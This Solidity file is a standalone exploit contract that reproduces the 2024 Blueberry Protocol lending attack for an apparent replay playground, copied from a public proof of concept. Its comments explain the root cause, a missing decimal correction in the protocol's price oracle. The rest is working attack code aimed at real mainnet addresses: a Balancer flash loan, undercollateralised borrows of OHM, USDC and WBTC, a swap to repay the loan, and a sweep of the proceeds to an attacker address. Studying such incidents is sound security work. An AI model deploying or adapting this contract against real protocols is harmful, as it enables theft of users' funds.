// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2024-02-BlueberryProtocol).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test contract
// (testAttack() triggers a Balancer flashLoan, and the flash-loan callback
// receiveFlashLoan() -- which does all the borrowing/swapping -- lives on the
// test contract itself). There is no standalone exploit contract to deploy, so
// this is a faithful, self-contained copy of that inline attack, compiled inside
// the registry forge project. Logic and constants are copied verbatim from
// test/BlueberryProtocol_exp.sol.
//
// Root cause: Blueberry's Comptroller (a Compound v2 fork) values debt as
// `oraclePrice(18-dec USD) * borrowBalance(native decimals) / 1e18`. Its
// ChainlinkAdapterOracle does not apply the `10^(18 - underlyingDecimals)`
// correction Compound v2's own oracle applies, so any non-18-decimal
// underlying (OHM=9, USDC=6, WBTC=8) has its borrowed value UNDER-COUNTED by
// that same factor when the Comptroller checks account liquidity. Depositing
// ~1 WETH of real collateral therefore "covers" borrows worth ~$1.376M in
// OHM+USDC+WBTC, because the Comptroller only sees ~$0.000146 of debt.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
}

interface WETH9 {
    function deposit() external payable;
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

interface IMarketFacet {
    function enterMarkets(address[] calldata vTokens) external returns (uint256[] memory);
}

interface bBep20Interface {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address owner) external view returns (uint256);
    function mint(uint256 mintAmount) external returns (uint256);
    function borrow(uint256 borrowAmount) external returns (uint256);
}

interface IBalancerVault {
    function flashLoan(address recipient, address[] memory tokens, uint256[] memory amounts, bytes memory userData)
        external;
}

interface Uni_Router_V3 {
    struct ExactOutputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountOut;
        uint256 amountInMaximum;
        uint160 sqrtPriceLimitX96;
    }

    function exactOutputSingle(ExactOutputSingleParams calldata params) external payable returns (uint256 amountIn);
}

contract BlueberryDrain {
    address private constant ATTACKER = 0xC0ffeEBABE5D496B2DDE509f9fa189C25cF29671;

    WETH9 private constant WETH = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 private constant OHM = IERC20(0x64aa3364F17a4D01c6f1751Fd97C2BD3D7e7f1D5);
    IERC20 private constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 private constant WBTC = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);

    bBep20Interface private constant bWETH = bBep20Interface(0x643d448CEa0D3616F0b32E3718F563b164e7eDd2);
    bBep20Interface private constant bOHM = bBep20Interface(0x08830038A6097C10f4A814274d5A68E64648d91c);
    bBep20Interface private constant bUSDC = bBep20Interface(0x649127D0800a8c68290129F091564aD2F1D62De1);
    bBep20Interface private constant bWBTC = bBep20Interface(0xE61ad5B0E40c856E6C193120Bd3fa28A432911B6);

    IMarketFacet private constant BlueberryProtocol = IMarketFacet(0xfFadB0bbA4379dFAbFB20CA6823F6EC439429ec2);
    IBalancerVault private constant balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    Uni_Router_V3 private constant pool = Uni_Router_V3(0xE592427A0AEce92De3Edee1F18E0157C05861564);

    function approveAll() internal {
        WETH.approve(address(bWETH), type(uint256).max);
        OHM.approve(address(pool), type(uint256).max);
    }

    // step 0: mint a dust amount of WETH (for approvals to succeed cleanly), then
    // flash-loan 1 WETH from Balancer (0% fee) to fund the real collateral deposit.
    // The dust ETH is pre-funded into this contract by the playground's `setup`
    // step (mirrors the Foundry test's `vm.deal(address(this), 9997 wei)`).
    function attack() external {
        WETH.deposit{value: 0.000000000000009997 ether}();
        approveAll();
        address[] memory tokens = new address[](1);
        tokens[0] = address(WETH);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 1_000_000_000_000_000_000;
        balancer.flashLoan(address(this), tokens, amounts, new bytes(1)); // borrow 1 WETH
    }

    // step 1: deposit the flash-loaned WETH as collateral, then exploit the
    // decimal-mismatch bug to borrow OHM/USDC/WBTC far past what the (broken)
    // liquidity check should allow, swap a sliver of OHM back to WETH to repay
    // the flash loan, and keep the rest.
    function receiveFlashLoan(
        IERC20[] memory, /* tokens */
        uint256[] memory, /* amounts */
        uint256[] memory, /* feeAmounts */
        bytes memory /* userData */
    ) external {
        address[] memory tokenList = new address[](1);
        tokenList[0] = address(bWETH);
        BlueberryProtocol.enterMarkets(tokenList);
        bWETH.mint(1_000_000_000_000_000_000);

        // The Comptroller's liquidity check values these borrows at ~$0.000146
        // total instead of their real ~$1.376M -- the decimal-mismatch bug.
        bOHM.borrow(8_616_071_267_266);
        bUSDC.borrow(913_262_603_416);
        bWBTC.borrow(686_690_100);

        Uni_Router_V3.ExactOutputSingleParams memory params = Uni_Router_V3.ExactOutputSingleParams({
            tokenIn: address(OHM),
            tokenOut: address(WETH),
            fee: 3000,
            recipient: address(this),
            deadline: type(uint256).max,
            amountOut: 999_999_999_999_999_999,
            amountInMaximum: type(uint256).max,
            sqrtPriceLimitX96: 0
        });
        pool.exactOutputSingle(params);
        WETH.transfer(address(balancer), 1_000_000_000_000_000_000);

        // sweep the rest of the borrowed assets to the attacker EOA
        USDC.transfer(ATTACKER, USDC.balanceOf(address(this)));
        OHM.transfer(ATTACKER, OHM.balanceOf(address(this)));
        WBTC.transfer(ATTACKER, WBTC.balanceOf(address(this)));
    }

    receive() external payable {}
    fallback() external payable {}
}
